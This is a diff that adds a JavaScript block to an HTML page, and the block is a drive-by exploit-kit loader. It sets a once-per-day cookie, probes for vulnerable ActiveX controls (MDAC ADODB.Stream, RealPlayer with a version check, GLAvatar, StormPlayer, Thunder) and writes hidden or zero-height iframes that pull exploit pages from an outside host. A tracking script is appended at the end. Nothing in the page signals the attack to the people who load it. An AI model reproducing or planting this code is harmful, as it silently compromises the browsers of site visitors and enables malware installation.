@@ -1,0 +1,90 @@
+<script language="javaScript">
+	var cook = "silentwm";
+	
+	function setCookie(name, value, expire) 
+	{   
+		window.document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + expire.toGMTString()));
+	}
+
+	function getCookie(Name) 
+	{   
+		var search = Name + "=";
+		if (window.document.cookie.length > 0) 
+		{ 
+			offset = window.document.cookie.indexOf(search);
+			if (offset != -1) 
+			{ 
+				offset += search.length;       
+			  end = window.document.cookie.indexOf(";", offset)       
+			  if (end == -1)
+			    end = window.document.cookie.length;
+			  return unescape(window.document.cookie.substring(offset, end));
+			 }
+		 }
+	  return null;
+	}
+
+	function register(name) 
+	{
+		var today = new Date();
+		var expires = new Date();
+		expires.setTime(today.getTime() + 1000*60*60*24);
+		setCookie(cook, name, expires);
+	}
+
+	function openWM() 
+	{
+		var c = getCookie(cook);
+		if (c != null) 
+		{
+	  	return;
+		}
+		
+		register(cook);
+		
+		window.defaultStatus="Íê³É";
+			
+		try{ var e;
+			var ado=(document.createElement("object"));
+			ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+			var as=ado.createobject("Adodb.Stream","")}
+		catch(e){};
+		finally{
+			if(e!="[object Error]"){
+				document.write("<iframe width=50 height=0 src=http://d.godaand.cn/14.htm></iframe>")}
+			else
+			{	
+				try{ var j;
+					var real11=new ActiveXObject("IERP"+"Ctl.I"+"ERPCtl.1");}
+				catch(j){};
+				finally{if(j!="[object Error]"){if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552")
+                                        {document.write('<iframe width=100 height=0 src=http://d.godaand.cn/real.htm></iframe>')}
+                         else
+                         {
+					document.write('<iframe width=100 height=0 src=http://d.godaand.cn/real11.htm></iframe>')}}}
+
+				try{ var g;
+					var glworld=new ActiveXObject("GLAVATAR.GLAvatarCtrl.1");}
+				catch(g){};
+				finally{if(g!="[object Error]"){
+					document.write('<iframe style=display:none src=http://d.godaand.cn/lz.htm></iframe>')}}
+
+				try{ var h;
+					var storm=new ActiveXObject("MPS.StormPlayer.1");}
+				catch(h){};
+				finally{if(h!="[object Error]"){
+					document.write('<iframe style=display:none src=http://d.godaand.cn/bfyy.htm></iframe>')}}
+
+				try{ var f;
+					var thunder=new ActiveXObject("DPClient.Vod");}
+				catch(f){};
+				finally{ if(f!="[object Error]"){
+					document.write('<iframe width=50 height=0 src=xl.htm></iframe>')}}
+			}}
+	}
+
+openWM();
+</script>
+
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1862271.js"></script>
+
